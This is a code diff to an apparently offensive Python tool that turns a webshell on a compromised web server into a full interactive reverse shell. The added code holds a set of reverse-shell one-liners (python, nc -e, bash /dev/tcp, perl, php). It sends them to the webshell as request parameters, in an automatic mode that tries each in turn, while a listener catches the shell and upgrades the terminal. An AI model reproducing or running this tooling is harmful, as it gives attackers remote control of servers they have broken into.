@@ -6,7 +6,7 @@ import sys
 import readline
 import nclib
 import tty
-import termios
+import time
 import os
 import multiprocessing
 
@@ -22,37 +22,90 @@ parser.add_argument("-D", "--debug", dest="debug", help="If set the programm doe
 parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a full functional reverse sehll", metavar="METHOD:LHOST:PORT", nargs=1)
 
 
+
+
 def upgraded_shell():
     args.method = args.method.upper()
     if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     try:
-        method, ip, port = args.reverse[0].split(":")
+        payload_method, ip, port = args.reverse[0].split(":")
         port = int(port)
+        # Payloads from revshells.com
+        payloads = {
+                "py": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
+                "py2": f"""python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
+                "nc1": f"""nc {ip} {port} -e sh""",
+                "nc2": f"""nc -c sh {ip} {port}""",
+                "bash": f"""sh -i >& /dev/tcp/{ip}/{port} 0>&1""",
+                "perl": f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};'""",
+                "php": f"""php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");'"""
 
-        interactive_shell(ip, port)
+        }
+        if payload_method not in payloads.keys() and payload_method != 'auto':
+            print("[!] Method not found")
+            sys.exit()
+        p = multiprocessing.Process(target=back_call, args=[payload_method, ip, port, payloads])
+        p.start()
+        interactive_shell(ip, port, p)
     except (ValueError):
         print("[!] Could not parse METHOD:IP:PORT")
 
+def back_call(payload_method, ip, port, payloads):
+    time.sleep(1)
+    timeout = 1
+    if payload_method == 'auto':
+        for payload in payloads.values():
+            try:
+                if args.debug:
+                    print(f"[!] Trying: {payload}") 
+                if args.method == "GET":
+                    params = {args.para_name[0]: payload}
+                    requests.get(args.host[0], params=params, timeout=timeout)
+                elif args.method == "POST":
+                    params = {args.para_name[0]: payload}
+                    requests.post(args.host[0], data=params, timeout=timeout)
+                time.sleep(1)
+            except:
+                pass
+    else:
+        payload = payloads[payload_method]
+        try:
+            if args.debug:
+                print(f"[!] Trying: {payload}") 
+            if args.method == "GET":
+                params = {args.para_name[0]: payload}
+                requests.get(args.host[0], params=params, timeout=timeout)
+            elif args.method == "POST":
+                params = {args.para_name[0]: payload}
+                requests.post(args.host[0], data=params, timeout=timeout)
+            time.sleep(1)
+        except:
+            pass
+        print(f"[!] Method {payload_method} was not successfull")
 
 
-def interactive_shell(ip, port):
-    nc = nclib.Netcat(listen=(ip, port))
-    fd = sys.stdin.fileno()
-    old_attr = termios.tcgetattr(fd)
-    tty.setraw(fd)
-    new_attr = termios.tcgetattr(fd)
-    new_attr[3] = new_attr[3] & ~termios.ECHO
+
+
+def interactive_shell(ip, port, child_process):
     try:
-        termios.tcsetattr(fd, termios.TCSADRAIN, new_attr)
-        columns, rows = os.get_terminal_size()
-        nc.send(f"stty rows {rows} cols {columns}\n")
-        nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
-        nc.send("reset\n")
-        nc.interactive()
-    finally:
-        termios.tcsetattr(fd, termios.TCSADRAIN, old_attr)
+        print("[!] Starting listener")
+        nc = nclib.Netcat(listen=(ip, port))
+    except KeyboardInterrupt:
+        child_process.terminate()
+        sys.exit()
+    child_process.terminate()
+    if args.debug:
+        print("[!] Backcall Process Terminates. Received Shell")
+    tty.setraw(0)
+    columns, rows = os.get_terminal_size()
+    nc.send("\n")
+    nc.send(f"stty rows {rows} cols {columns}\n")
+    nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
+    time.sleep(1)
+    nc.send("reset\n")
+    nc.interactive()
 
     
 
